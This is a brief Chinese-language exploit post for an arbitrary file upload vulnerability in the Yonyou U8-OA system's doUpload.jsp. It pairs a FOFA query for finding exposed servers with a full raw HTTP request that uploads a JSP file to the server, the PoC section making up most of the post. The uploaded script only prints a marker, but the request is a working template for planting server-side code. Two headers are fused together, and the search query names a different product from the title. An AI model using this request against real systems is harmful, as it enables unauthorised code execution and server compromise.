## 用友U8-OA协同工作系统doUpload.jsp任意文件上传漏洞

## fofa
```
"用友U8 Cloud"
```
![image](https://github.com/wy876/POC/assets/139549762/c39bc2dc-867f-451b-af53-3ea1093e9546)

## poc
```
POST /yyoa/portal/tools/doUpload.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept-Encoding: gzip, deflate, br
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Connection: closeContent-Type: multipart/form-data; boundary=7b1db34fff56ef636e9a5cebcd6c9a75
Host:
Upgrade-Insecure-Requests: 1
Content-Length: 217

--7b1db34fff56ef636e9a5cebcd6c9a75
Content-Disposition: form-data; name="iconFile"; filename="info.jsp"
Content-Type: application/octet-stream

<% out.println("tteesstt1"); %>
--7b1db34fff56ef636e9a5cebcd6c9a75--
```

![image](https://github.com/wy876/POC/assets/139549762/2beed268-4f9f-4548-bdf9-a8a7f361f660)
